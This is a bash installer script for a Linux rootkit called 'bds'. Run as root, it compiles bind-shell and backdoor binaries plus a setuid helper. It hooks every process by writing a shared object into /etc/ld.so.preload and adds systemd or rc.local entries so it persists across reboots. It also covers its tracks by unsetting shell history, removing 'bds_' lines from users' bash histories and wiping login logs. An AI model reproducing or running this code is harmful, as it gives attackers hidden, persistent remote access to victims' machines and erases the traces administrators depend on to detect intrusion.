#!/bin/bash

os="unknown"
command="pwd"
HOME_DIR=$($command)
if [ "$(id -u)" -ne 0 ]; then echo "Please run as root." >&2; exit 1; fi

check_os() {
	echo "[+] Checking your operating system"
	command="pacman --version"
	output=$($command)
	if [[ $output == *"Pacman v"* ]];
	then
		os="arch based"
	fi
	command="apt-get --version"
	output=$($command)
	if [[ $output == *"Supported modules"* ]];
	then
		os="debian based"
	fi
	command="yum --version"
	output=$($command)
	if [[ $output == *"Installed:"* ]];
	then
		os="redhat based"
	fi
        if [[ $os == "unknown" ]]
        then
            echo "your os: $os"
            echo "your linux distribution is not supported by this installer"
            echo "you need to install bds_lkm manually"
            exit
        fi
	echo "[+] Your os is "$os
}

install_prequisites() {
    echo "[+] installing prequisites"
    if [[ "$os" == "debian based" ]]
    then
        echo "[+] installing for debian based"
	apt update
        apt -y install gcc
    elif [[ "$os" == "redhat based" ]]
    then
        echo "[+] installing for redhat based"
	yum update
        yum -y install gcc
        echo "[+] warning  ! you might need to restart and rerun install.sh !"
    elif [[ "$os" == "arch based" ]]
    then
        echo "[+] installing for arch based"
	pacman -Syu
        pacman -S gcc
    fi
}       

install_utils() {
	echo "[+] installing utils"
	cd $HOME_DIR
	echo "" > /etc/ld.so.preload
	nohup killall -9 bds_bindshell
	nohup killall -9 bds_daemon
	unset HISTFILE
        mkdir /opt/bds_elf
        cd utils
        gcc -o /opt/bds_elf/bds_vanish bds_vanish.c
        FILE="/opt/bds_elf/bds_vanish"
	if [ -f "$FILE" ]; then
            echo "[+] binary compiled successfully !"
            gcc -o /opt/bds_elf/bds_bindshell bds_bindshell.c
            gcc -o /opt/bds_elf/bds_bc bds_bc.c
            gcc -o /opt/bds_elf/bds_daemon bds_daemon.c
            gcc -o /opt/bds_elf/bds_rr bds_rr.c
            gcc -o /opt/bds_elf/bds_br bds_br.c
            gcc -o /opt/bds_elf/bds_bdr bds_bdr.c
            gcc -o /opt/bds_elf/bds_suid bds_suid.c
            chmod u+s /opt/bds_elf/bds_suid
            
        else
            echo "[-] fatal error failed to compile binary ! please install gcc manually !"
            exit
        fi
}

install_bds() {
	echo "[+] installing shared object"
	cd $HOME_DIR
	gcc  -fPIC -shared  bds.c -o bds.so -ldl
	FILE="bds.so"
	if [ -f "$FILE" ]; then
		echo "[+] share object build success"
		cp bds.so /opt/bds_elf
         else
		echo "[-] fatal error failed to build !"
		exit
	fi
}

install_systemd() {
    cd $HOME_DIR
    echo "[+] installing init script to survive after reboot"
    pwd
    cp inits/rk_start.sh /opt/bds_elf
    cp stops/rk_stop.sh /opt/bds_elf
    chmod +x /opt/bds_elf/rk_start.sh
    chmod +x /opt/bds_elf/rk_stop.sh
    SYSTEMD="/etc/systemd/system/"
    if [ -d "$SYSTEMD" ]; then
	echo "[+] systemd found"
        cp inits/rk.service /etc/systemd/system/
        chmod 644  /etc/systemd/system/rk.service
	cp stops/rk_stop.service /etc/systemd/system/
        chmod 644  /etc/systemd/system/rk_stop.service
	systemctl daemon-reload
        systemctl enable rk.service
	systemctl enable rk_stop.service
    else
	cp rc.local /etc/
	chmod +x /etc/rc.local
    fi
    echo "[+] init script installed"
}

fix_bash_history() {
    user=$1
    check="root"
    if [[ "$user" == "$check" ]]
    then
        echo "[+] cleanup root bash_history"
        cmd="mv /root/.bash_history /root/.bash_history.bak"
        input="/root/.bash_history.bak"
        output="/root/.bash_history"
    else
        echo "[+] clean $user bash_history"
        cmd="mv /home/$user/.bash_history /home/$user/.bash_history.bak"
        input="/home/$user/.bash_history.bak"
        output="/home/$user/.bash_history"
    fi
    $cmd
    while IFS= read -r line
	do
	if [[ "$line" == *"bds_"* ]] 
	then
            line=""
	else
            echo "$line" >> "${output}"
        fi
	done < "$input"
}

clean_logs() {
    echo "[+] cleaning logs"
    input="usernames_to_clear_logs.txt"
    while IFS= read -r line
	do
            user=${line/$'\n'/}
            cmd="/opt/bds_elf/bds_vanish $user 0 0"
            eval $cmd
            fix_bash_history $user
    done < "$input"
    rm -f *.hm
}

run() {
	cd /;/opt/bds_elf/bds_bdr &
	cd /;/opt/bds_elf/bds_br &
	echo "/opt/bds_elf/bds.so" > /etc/ld.so.preload
}

if [[ "$1" == "direct" ]]
then 
    echo "[+] installing without prequisites"
else
    check_os
    install_prequisites
fi
install_utils
install_bds
install_systemd
clean_logs
run
echo "[+] installation finished !"